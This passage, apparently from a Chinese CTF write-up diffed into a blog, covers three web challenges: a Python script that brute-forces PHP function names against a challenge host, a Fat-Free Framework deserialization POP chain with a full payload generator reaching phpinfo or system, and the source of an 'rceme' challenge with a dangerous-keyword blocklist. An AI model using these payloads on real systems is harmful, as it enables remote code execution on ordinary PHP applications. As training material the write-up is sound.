curl_multi_strerror curl_reset curl_escape curl_unescape curl_pause curl_multi_init curl_multi_add_handle curl_multi_remove_handle curl_multi_select curl_multi_exec curl_multi_getcontent curl_multi_info_read curl_multi_close curl_multi_setopt curl_share_init curl_share_close curl_share_setopt curl_file_create gd_info imagearc imageellipse imagechar imagecharup imagecolorat imagecolorallocate imagepalettecopy imagecreatefromstring imagecolorclosest imagecolorclosesthwb imagecolordeallocate imagecolorresolve imagecolorexact imagecolorset imagecolortransparent imagecolorstotal imagecolorsforindex imagecopy imagecopymerge imagecopymergegray imagecopyresized imagecreate imagecreatetruecolor imageistruecolor imagetruecolortopalette imagepalettetotruecolor imagesetthickness imagefilledarc imagefilledellipse imagealphablending imagesavealpha imagecolorallocatealpha imagecolorresolvealpha imagecolorclosestalpha imagecolorexactalpha imagecopyresampled imagegrabwindow imagegrabscreen imagerotate imageflip imageantialias imagecrop imagecropauto imagescale imageaffine imageaffinematrixconcat imageaffinematrixget imagesetinterpolation imagesettile imagesetbrush imagesetstyle imagecreatefrompng imagecreatefromwebp imagecreatefromgif imagecreatefromjpeg imagecreatefromwbmp imagecreatefromxbm imagecreatefromxpm imagecreatefromgd imagecreatefromgd2 imagecreatefromgd2part imagepng imagewebp imagegif imagejpeg imagewbmp imagegd imagegd2 imagedestroy imagegammacorrect imagefill imagefilledpolygon imagefilledrectangle imagefilltoborder imagefontwidth imagefontheight imageinterlace imageline imageloadfont imagepolygon imagerectangle imagesetpixel imagestring imagestringup imagesx imagesy imagedashedline imagettfbbox imagettftext imageftbbox imagefttext imagetypes jpeg2wbmp png2wbmp image2wbmp imagelayereffect imagexbm imagecolormatch imagefilter imageconvolution mb_convert_case mb_strtoupper mb_strtolower mb_language mb_internal_encoding mb_http_input mb_http_output mb_detect_order mb_substitute_character mb_parse_str mb_output_handler mb_preferred_mime_name mb_strlen mb_strpos mb_strrpos mb_stripos mb_strripos mb_strstr mb_strrchr mb_stristr mb_strrichr mb_substr_count mb_substr mb_strcut mb_strwidth mb_strimwidth mb_convert_encoding mb_detect_encoding mb_list_encodings mb_encoding_aliases mb_convert_kana mb_encode_mimeheader mb_decode_mimeheader mb_convert_variables mb_encode_numericentity mb_decode_numericentity mb_send_mail mb_get_info mb_check_encoding mb_regex_encoding mb_regex_set_options mb_ereg mb_eregi mb_ereg_replace mb_eregi_replace mb_ereg_replace_callback mb_split mb_ereg_match mb_ereg_search mb_ereg_search_pos mb_ereg_search_regs mb_ereg_search_init mb_ereg_search_getregs mb_ereg_search_getpos mb_ereg_search_setpos mbregex_encoding mbereg mberegi mbereg_replace mberegi_replace mbsplit mbereg_match mbereg_search mbereg_search_pos mbereg_search_regs mbereg_search_init mbereg_search_getregs mbereg_search_getpos mbereg_search_setpos mysql_connect mysql_pconnect mysql_close mysql_select_db mysql_query mysql_unbuffered_query mysql_db_query mysql_list_dbs mysql_list_tables mysql_list_fields mysql_list_processes mysql_error mysql_errno mysql_affected_rows mysql_insert_id mysql_result mysql_num_rows mysql_num_fields mysql_fetch_row mysql_fetch_array mysql_fetch_assoc mysql_fetch_object mysql_data_seek mysql_fetch_lengths mysql_fetch_field mysql_field_seek mysql_free_result mysql_field_name mysql_field_table mysql_field_len mysql_field_type mysql_field_flags mysql_escape_string mysql_real_escape_string mysql_stat mysql_thread_id mysql_client_encoding mysql_ping mysql_get_client_info mysql_get_host_info mysql_get_proto_info mysql_get_server_info mysql_info mysql_set_charset mysql mysql_fieldname mysql_fieldtable mysql_fieldlen mysql_fieldtype mysql_fieldflags mysql_selectdb mysql_freeresult mysql_numfields mysql_numrows mysql_listdbs mysql_listtables mysql_listfields mysql_db_name mysql_dbname mysql_tablename mysql_table_name mysqli_affected_rows mysqli_autocommit mysqli_begin_transaction mysqli_change_user mysqli_character_set_name mysqli_close mysqli_commit mysqli_connect mysqli_connect_errno mysqli_connect_error mysqli_data_seek mysqli_dump_debug_info mysqli_debug mysqli_errno mysqli_error mysqli_error_list mysqli_stmt_execute mysqli_execute mysqli_fetch_field mysqli_fetch_fields mysqli_fetch_field_direct mysqli_fetch_lengths mysqli_fetch_all mysqli_fetch_array mysqli_fetch_assoc mysqli_fetch_object mysqli_fetch_row mysqli_field_count mysqli_field_seek mysqli_field_tell mysqli_free_result mysqli_get_connection_stats mysqli_get_client_stats mysqli_get_charset mysqli_get_client_info mysqli_get_client_version mysqli_get_host_info mysqli_get_proto_info mysqli_get_server_info mysqli_get_server_version mysqli_get_warnings mysqli_init mysqli_info mysqli_insert_id mysqli_kill mysqli_more_results mysqli_multi_query mysqli_next_result mysqli_num_fields mysqli_num_rows mysqli_options mysqli_ping mysqli_poll mysqli_prepare mysqli_report mysqli_query mysqli_real_connect mysqli_real_escape_string mysqli_real_query mysqli_reap_async_query mysqli_release_savepoint mysqli_rollback mysqli_savepoint mysqli_select_db mysqli_set_charset mysqli_stmt_affected_rows mysqli_stmt_attr_get mysqli_stmt_attr_set mysqli_stmt_bind_param mysqli_stmt_bind_result mysqli_stmt_close mysqli_stmt_data_seek mysqli_stmt_errno mysqli_stmt_error mysqli_stmt_error_list mysqli_stmt_fetch mysqli_stmt_field_count mysqli_stmt_free_result mysqli_stmt_get_result mysqli_stmt_get_warnings mysqli_stmt_init mysqli_stmt_insert_id mysqli_stmt_more_results mysqli_stmt_next_result mysqli_stmt_num_rows mysqli_stmt_param_count mysqli_stmt_prepare mysqli_stmt_reset mysqli_stmt_result_metadata mysqli_stmt_send_long_data mysqli_stmt_store_result mysqli_stmt_sqlstate mysqli_sqlstate mysqli_ssl_set mysqli_stat mysqli_store_result mysqli_thread_id mysqli_thread_safe mysqli_use_result mysqli_warning_count mysqli_refresh mysqli_escape_string mysqli_set_opt xdebug_get_stack_depth xdebug_get_function_stack xdebug_get_formatted_function_stack xdebug_print_function_stack xdebug_get_declared_vars xdebug_call_class xdebug_call_function xdebug_call_file xdebug_call_line xdebug_var_dump xdebug_debug_zval xdebug_debug_zval_stdout xdebug_enable xdebug_disable xdebug_is_enabled xdebug_break xdebug_start_trace xdebug_stop_trace xdebug_get_tracefile_name xdebug_get_profiler_filename xdebug_dump_aggr_profiling_data xdebug_clear_aggr_profiling_data xdebug_memory_usage xdebug_peak_memory_usage xdebug_time_index xdebug_start_error_collection xdebug_stop_error_collection xdebug_get_collected_errors xdebug_start_function_monitor xdebug_stop_function_monitor xdebug_get_monitored_functions xdebug_start_code_coverage xdebug_stop_code_coverage xdebug_get_code_coverage xdebug_code_coverage_started xdebug_get_function_count xdebug_dump_superglobals xdebug_get_headers dl cli_set_process_title cli_get_process_title 
+
+</span><span class="sh">'''</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">)</span>
+<span class="c1"># print s[0]
+# print s
+# con = requests.get('http://eci-2zed3ztpomt9jfpdablo.cloudeci1.ichunqiu.com/?a=call_user_func&amp;b='+s[0]).text
+# print con
+</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
+    <span class="n">con</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">http://eci-2zed3ztpomt9k9atz5n9.cloudeci1.ichunqiu.com/?a=</span><span class="sh">'</span><span class="o">+</span><span class="n">i</span><span class="p">).</span><span class="n">text</span>
+    <span class="k">if</span> <span class="sh">'</span><span class="s">flag</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">con</span><span class="p">:</span>
+        <span class="c1"># if con != nothing:
+</span>        <span class="k">print</span> <span class="n">i</span>
+        <span class="k">print</span> <span class="n">con</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p><strong>参考资料</strong>：</p>
+
+<ul>
+  <li><a href="https://www.jc2182.com/php/php-pcntl-wifexited-ref.html">pcntl_wifexited 进程控制函数</a></li>
+</ul>
+
+<h2 id="web2babyunserialize">web2：babyunserialize</h2>
+
+<p>这道题与WMCTF2020基本一致。</p>
+
+<h3 id="考点">考点</h3>
+
+<ul>
+  <li>
+    <p>类的数组动态调用</p>
+
+    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+  
+<span class="kd">class</span> <span class="nc">A</span><span class="p">{</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="n">test</span><span class="p">(){</span>
+        <span class="k">echo</span> <span class="s2">"aaaa"</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+  
+<span class="nv">$tr</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="k">new</span> <span class="nc">A</span><span class="p">(),</span><span class="s2">"test"</span><span class="p">);</span>
+<span class="nv">$tr</span><span class="p">();</span><span class="c1">//这样就可以直接调用到A的test函数</span>
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>找到函数名与参数名均可控的点</p>
+  </li>
+  <li>
+    <p>反序列化数组的先后顺序</p>
+  </li>
+</ul>
+
+<h3 id="思路-1">思路</h3>
+
+<ul>
+  <li>
+    <p>找到可以利用的__destuct函数，这里找的是CLI\Agent类。</p>
+
+    <ul>
+      <li>
+        <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">__destruct</span><span class="p">()</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">server</span><span class="o">-&gt;</span><span class="n">events</span><span class="p">[</span><span class="s1">'disconnect'</span><span class="p">])</span> <span class="o">&amp;&amp;</span>
+    <span class="nb">is_callable</span><span class="p">(</span><span class="nv">$func</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">server</span><span class="o">-&gt;</span><span class="n">events</span><span class="p">[</span><span class="s1">'disconnect'</span><span class="p">]))</span>
+    <span class="nv">$func</span><span class="p">(</span><span class="nv">$this</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>        </div>
+
+        <p>这里可以利用对象与其成员方法的数组，调用任意对象的任意方法。</p>
+
+        <p><code class="language-plaintext highlighter-rouge">$this-&gt;server-&gt;events['disconnect'] = array(xxx类，xxx类的某个成员函数)</code></p>
+
+        <p>所以下一步就是寻找调用哪个方法。于wmctf 中的webweb一致，我们需要在这一个函数里找到这样一条语句：调用了某个函数，且函数名与函数参数可控的语句。</p>
+
+        <p>在DB\Jig\Mapper中找到了update方法。</p>
+
+        <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">update</span><span class="p">()</span> <span class="p">{</span>
+        <span class="nv">$db</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">db</span><span class="p">;</span>
+        <span class="nv">$now</span><span class="o">=</span><span class="nb">microtime</span><span class="p">(</span><span class="kc">TRUE</span><span class="p">);</span>
+        <span class="nv">$data</span><span class="o">=&amp;</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="nf">read</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">file</span><span class="p">);</span>
+        <span class="mf">....</span>
+</code></pre></div>        </div>
+
+        <p>这里就相当于执行了$this-&gt;db-&gt;read($this-&gt;file)</p>
+
+        <p>我们可以控制上一步跳到这个函数里，$this-&gt;db是可以控制的，我们可以控制$this-&gt;db为一个类，调用read方法。如果read方法不存在即可触发__call，下一步寻找可用的__call</p>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <p>可以考虑SQL\Mapper中的__call方法</p>
+
+    <ul>
+      <li>
+        <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">__call</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span><span class="nv">$args</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nb">call_user_func_array</span><span class="p">(</span>
+            <span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">props</span><span class="p">)</span><span class="o">?</span>
+                <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">props</span><span class="p">[</span><span class="nv">$func</span><span class="p">]</span><span class="o">:</span>
+                <span class="nv">$this</span><span class="o">-&gt;</span><span class="nv">$func</span><span class="p">),</span><span class="nv">$args</span>
+        <span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>        </div>
+
+        <p>如果上一步触发这里的__call方法。$func是可控的，并且$args就是我们上一步传进来的args。$this-&gt;props也是我们可控的。所以这一步我们可以控制$this-&gt;props[$func].也就相当于执行了<code class="language-plaintext highlighter-rouge">call_user_func_array($this-&gt;props[$func]($args))</code>.</p>
+
+        <p>结合上一步，这里$func为”read”，$args为上一步的$this-&gt;file。</p>
+
+        <p>所以我们可以使$this-&gt;props = array(“read”=&gt;”system”)的一个数组。上一步中的$this-&gt;file为”whoami”即可执行。由于这道题flag在phpinfo中，所以控制read=&gt;phpinfo,$this-&gt;file为INFO_ALL。</p>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <p>理清思路：</p>
+
+    <ul>
+      <li>
+        <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nv">$SQLMapper</span><span class="o">=</span><span class="k">new</span> <span class="nc">DB\SQL\Mapper</span><span class="p">();</span>
+  <span class="nv">$JigMapper</span><span class="o">=</span><span class="k">new</span> <span class="nc">DB\Jig\Mapper</span><span class="p">(</span><span class="nv">$SQLMapper</span><span class="p">,</span><span class="no">INFO_ALL</span> <span class="p">);</span>
+  <span class="nv">$DBMongo</span><span class="o">=</span><span class="k">new</span> <span class="nc">DB\Mongo</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">'disconnect'</span><span class="o">=&gt;</span><span class="k">array</span><span class="p">(</span><span class="nv">$JigMapper</span><span class="p">,</span><span class="s2">"update"</span><span class="p">)));</span>
+  <span class="nv">$Agent</span><span class="o">=</span><span class="k">new</span> <span class="nc">CLI\Agent</span><span class="p">(</span><span class="nv">$DBMongo</span><span class="p">);</span>
+  <span class="k">echo</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$Agent</span><span class="p">));</span>
+</code></pre></div>        </div>
+
+        <p>这里用DB\Mongo这一个新建的类进行中转。效果同样是控制$this-&gt;server-&gt;events[‘disconnect’]后面的array($JigMapper,”update”)</p>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <p>调试</p>
+
+    <ul>
+      <li>
+        <p>unserialize后进入autoload加载类。</p>
+
+        <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">protected</span> <span class="k">function</span> <span class="n">autoload</span><span class="p">(</span><span class="nv">$class</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$class</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">fixslashes</span><span class="p">(</span><span class="nb">ltrim</span><span class="p">(</span><span class="nv">$class</span><span class="p">,</span><span class="s1">'\\'</span><span class="p">));</span>
+        <span class="cd">/** @var callable $func */</span>
+        <span class="nv">$func</span><span class="o">=</span><span class="kc">NULL</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$path</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">hive</span><span class="p">[</span><span class="s1">'AUTOLOAD'</span><span class="p">])</span> <span class="o">&amp;&amp;</span>
+            <span class="k">isset</span><span class="p">(</span><span class="nv">$path</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">is_callable</span><span class="p">(</span><span class="nv">$path</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
+            <span class="k">list</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span><span class="nv">$func</span><span class="p">)</span><span class="o">=</span><span class="nv">$path</span><span class="p">;</span>
+        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nb">split</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">hive</span><span class="p">[</span><span class="s1">'PLUGINS'</span><span class="p">]</span><span class="mf">.</span><span class="s1">';'</span><span class="mf">.</span><span class="nv">$path</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$auto</span><span class="p">)</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nv">$func</span> <span class="o">&amp;&amp;</span> <span class="nb">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="o">=</span><span class="nv">$func</span><span class="p">(</span><span class="nv">$auto</span><span class="mf">.</span><span class="nv">$class</span><span class="p">)</span><span class="mf">.</span><span class="s1">'.php'</span><span class="p">)</span> <span class="o">||</span>
+                <span class="nb">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="o">=</span><span class="nv">$auto</span><span class="mf">.</span><span class="nv">$class</span><span class="mf">.</span><span class="s1">'.php'</span><span class="p">)</span> <span class="o">||</span>
+                <span class="nb">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="o">=</span><span class="nv">$auto</span><span class="mf">.</span><span class="nb">strtolower</span><span class="p">(</span><span class="nv">$class</span><span class="p">)</span><span class="mf">.</span><span class="s1">'.php'</span><span class="p">)</span> <span class="o">||</span>
+                <span class="nb">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="o">=</span><span class="nb">strtolower</span><span class="p">(</span><span class="nv">$auto</span><span class="mf">.</span><span class="nv">$class</span><span class="p">)</span><span class="mf">.</span><span class="s1">'.php'</span><span class="p">))</span>
+                <span class="k">return</span> <span class="k">require</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+    <span class="p">}</span>
+</code></pre></div>        </div>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200825080802566.png#pic_center)
+
+
+
+这一句判断是否存在agent.php，但是cil目录下是没有agent.php文件的。所以这里没有将Agent类包含进来，也就无法正常反序列化。
+
+![在这里插入图片描述](https://img-blog.csdnimg.cn/2020082508084047.png#pic_center)
+
+  - 解决办法：由于ws.php是存在的，而Agent类也是在ws.php中，我们只需要在Agent类反序列化前先反序列化一个ws类，即可将Agent类引入。做法是反序列化一个数组：`serialize(array(new WS(),new Agent()))`
+
+结合以上，得到如下payload，参考了wmctf webweb官方writeup。
+
+### payload:
+
+```bash
+&lt;?php
+namespace CLI{
+    class Agent
+    {
+        protected $server;
+        public function __construct($server)
+        {
+            $this-&gt;server=$server;
+        }
+    }
+
+    class WS
+    {
+    }
+}
+namespace DB{
+    abstract class Cursor  implements \IteratorAggregate {}
+    class Mongo {
+        public $events;
+        public function __construct($events)
+        {
+            $this-&gt;events=$events;
+        }
+    }
+}
+
+namespace DB\Jig{
+    class Mapper extends \DB\Cursor {
+        protected $legacy=0;
+        protected $db;
+        protected $file;
+        function offsetExists($offset){}
+        function offsetGet($offset){}
+        function offsetSet($offset, $value){}
+        function offsetUnset($offset){}
+        function getIterator(){}
+        public function __construct($db,$file){
+            $this-&gt;db=$db;
+            $this-&gt;file=$file;
+        }
+    }
+}
+namespace DB\SQL{
+    class Mapper extends \DB\Cursor{
+        protected $props=["read"=&gt;"phpinfo"];
+        function offsetExists($offset){}
+        function offsetGet($offset){}
+        function offsetSet($offset, $value){}
+        function offsetUnset($offset){}
+        function getIterator(){}
+    }
+}
+
+namespace{
+    $SQLMapper=new DB\SQL\Mapper();
+//    echo serialize($SQLMapper),"\n";
+    $JigMapper=new DB\Jig\Mapper($SQLMapper,INFO_ALL );
+//    $MongoMapper  = new CLI\WS();
+    $DBMongo=new DB\Mongo(array('disconnect'=&gt;array($JigMapper,"update")));
+    $Agent=new CLI\Agent($DBMongo);
+    $WS=new CLI\WS();
+    echo urlencode(serialize(array($WS,$Agent)));
+}
+</code></pre></div></div>
+
+<h2 id="web3rceme">web3：rceme</h2>
+
+<p>参考：</p>
+
+<ul>
+  <li>https://www.anquanke.com/post/id/173991#h2-5</li>
+</ul>
+
+<h3 id="题目源码">题目源码</h3>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+<span class="nf">parserIfLabel</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'a'</span><span class="p">]);</span>
+<span class="k">function</span> <span class="n">danger_key</span><span class="p">(</span><span class="nv">$s</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$s</span><span class="o">=</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$s</span><span class="p">);</span>
+    <span class="nv">$key</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="s1">'php'</span><span class="p">,</span><span class="s1">'preg'</span><span class="p">,</span><span class="s1">'server'</span><span class="p">,</span><span class="s1">'chr'</span><span class="p">,</span><span class="s1">'decode'</span><span class="p">,</span><span class="s1">'html'</span><span class="p">,</span><span class="s1">'md5'</span><span class="p">,</span><span class="s1">'post'</span><span class="p">,</span><span class="s1">'get'</span><span class="p">,</span><span class="s1">'request'</span><span class="p">,</span><span class="s1">'file'</span><span class="p">,</span><span class="s1">'cookie'</span><span class="p">,</span><span class="s1">'session'</span><span class="p">,</span><span class="s1">'sql'</span><span class="p">,</span><span class="s1">'mkdir'</span><span class="p">,</span><span class="s1">'copy'</span><span class="p">,</span><span class="s1">'fwrite'</span><span class="p">,</span><span class="s1">'del'</span><span class="p">,</span><span class="s1">'encrypt'</span><span class="p">,</span><span class="s1">'$'</span><span class="p">,</span><span class="s1">'system'</span><span class="p">,</span><span class="s1">'exec'</span><span class="p">,</span><span class="s1">'shell'</span><span class="p">,</span><span class="s1">'open'</span><span class="p">,</span><span class="s1">'ini_'</span><span class="p">,</span><span class="s1">'chroot'</span><span class="p">,</span><span class="s1">'eval'</span><span class="p">,</span><span class="s1">'passthru'</span><span class="p">,</span><span class="s1">'include'</span><span class="p">,</span><span class="s1">'require'</span><span class="p">,</span><span class="s1">'assert'</span><span class="p">,</span><span class="s1">'union'</span><span class="p">,</span><span class="s1">'create'</span><span class="p">,</span><span class="s1">'func'</span><span class="p">,</span><span class="s1">'symlink'</span><span class="p">,</span><span class="s1">'sleep'</span><span class="p">,</span><span class="s1">'ord'</span><span class="p">,</span><span class="s1">'str'</span><span class="p">,</span><span class="s1">'source'</span><span class="p">,</span><span class="s1">'rev'</span><span class="p">,</span><span class="s1">'base_convert'</span><span class="p">);</span>
+    <span class="nv">$s</span> <span class="o">=</span> <span class="nb">str_ireplace</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span><span class="s2">"*"</span><span class="p">,</span><span class="nv">$s</span><span class="p">);</span>
+    <span class="nv">$danger</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="s1">'php'</span><span class="p">,</span><span class="s1">'preg'</span><span class="p">,</span><span class="s1">'server'</span><span class="p">,</span><span class="s1">'chr'</span><span class="p">,</span><span class="s1">'decode'</span><span class="p">,</span><span class="s1">'html'</span><span class="p">,</span><span class="s1">'md5'</span><span class="p">,</span><span class="s1">'post'</span><span class="p">,</span><span class="s1">'get'</span><span class="p">,</span><span class="s1">'request'</span><span class="p">,</span><span class="s1">'file'</span><span class="p">,</span><span class="s1">'cookie'</span><span class="p">,</span><span class="s1">'session'</span><span class="p">,</span><span class="s1">'sql'</span><span class="p">,</span><span class="s1">'mkdir'</span><span class="p">,</span><span class="s1">'copy'</span><span class="p">,</span><span class="s1">'fwrite'</span><span class="p">,</span><span class="s1">'del'</span><span class="p">,</span><span class="s1">'encrypt'</span><span class="p">,</span><span class="s1">'$'</span><span class="p">,</span><span class="s1">'system'</span><span class="p">,</span><span class="s1">'exec'</span><span class="p">,</span><span class="s1">'shell'</span><span class="p">,</span><span class="s1">'open'</span><span class="p">,</span><span class="s1">'ini_'</span><span class="p">,</span><span class="s1">'chroot'</span><span class="p">,</span><span class="s1">'eval'</span><span class="p">,</span><span class="s1">'passthru'</span><span class="p">,</span><span class="s1">'include'</span><span class="p">,</span><span class="s1">'require'</span><span class="p">,</span><span class="s1">'assert'</span><span class="p">,</span><span class="s1">'union'</span><span class="p">,</span><span class="s1">'create'</span><span class="p">,</span><span class="s1">'func'</span><span class="p">,</span><span class="s1">'symlink'</span><span class="p">,</span><span class="s1">'sleep'</span><span class="p">,</span><span class="s1">'ord'</span><span class="p">,</span><span class="s1">'str'</span><span class="p">,</span><span class="s1">'source'</span><span class="p">,</span><span class="s1">'rev'</span><span class="p">,</span><span class="s1">'base_convert'</span><span class="p">);</span>
+    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$danger</span> <span class="k">as</span> <span class="nv">$val</span><span class="p">){</span>
+        <span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span><span class="nv">$val</span><span class="p">)</span> <span class="o">!==</span><span class="kc">false</span><span class="p">){</span>
+            <span class="k">die</span><span class="p">(</span><span class="s1">'很抱歉，执行出错，发现危险字符【'</span><span class="mf">.</span><span class="nv">$val</span><span class="mf">.</span><span class="s1">'】'</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/^[a-z]$/i"</span><span class="p">)){</span>
+        <span class="k">die</span><span class="p">(</span><span class="s1">'很抱歉，执行出错，发现危险字符'</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nv">$s</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="n">parserIfLabel</span><span class="p">(</span> <span class="nv">$content</span> <span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$pattern</span> <span class="o">=</span> <span class="s1">'/\{if:([\s\S]+?)}([\s\S]*?){end\s+if}/'</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="nb">preg_match_all</span><span class="p">(</span> <span class="nv">$pattern</span><span class="p">,</span> <span class="nv">$content</span><span class="p">,</span> <span class="nv">$matches</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$count</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span> <span class="nv">$matches</span><span class="p">[</span> <span class="mi">0</span> <span class="p">]</span> <span class="p">);</span>
+        <span class="k">for</span> <span class="p">(</span> <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$count</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span> <span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$flag</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
+            <span class="nv">$out_html</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
+            <span class="nv">$ifstr</span> <span class="o">=</span> <span class="nv">$matches</span><span class="p">[</span> <span class="mi">1</span> <span class="p">][</span> <span class="nv">$i</span> <span class="p">];</span>
+            <span class="nv">$ifstr</span><span class="o">=</span><span class="nf">danger_key</span><span class="p">(</span><span class="nv">$ifstr</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
+            <span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$ifstr</span><span class="p">,</span><span class="s1">'='</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">){</span>
+                <span class="nv">$arr</span><span class="o">=</span> <span class="nf">splits</span><span class="p">(</span><span class="nv">$ifstr</span><span class="p">,</span><span class="s1">'='</span><span class="p">);</span>
+                <span class="k">if</span><span class="p">(</span><span class="nv">$arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">==</span><span class="s1">''</span> <span class="o">||</span> <span class="nv">$arr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">==</span><span class="s1">''</span><span class="p">){</span>
+                    <span class="k">die</span><span class="p">(</span><span class="s1">'很抱歉，模板中有错误的判断,请修正【'</span><span class="mf">.</span><span class="nv">$ifstr</span><span class="mf">.</span><span class="s1">'】'</span><span class="p">);</span>
+                <span class="p">}</span>
+                <span class="nv">$ifstr</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span> <span class="s1">'='</span><span class="p">,</span> <span class="s1">'=='</span><span class="p">,</span> <span class="nv">$ifstr</span> <span class="p">);</span>
+            <span class="p">}</span>
+            <span class="nv">$ifstr</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span> <span class="s1">'&lt;&gt;'</span><span class="p">,</span> <span class="s1">'!='</span><span class="p">,</span> <span class="nv">$ifstr</span> <span class="p">);</span>
+            <span class="nv">$ifstr</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span> <span class="s1">'or'</span><span class="p">,</span> <span class="s1">'||'</span><span class="p">,</span> <span class="nv">$ifstr</span> <span class="p">);</span>
+            <span class="nv">$ifstr</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span> <span class="s1">'and'</span><span class="p">,</span> <span class="s1">'&amp;&amp;'</span><span class="p">,</span> <span class="nv">$ifstr</span> <span class="p">);</span>
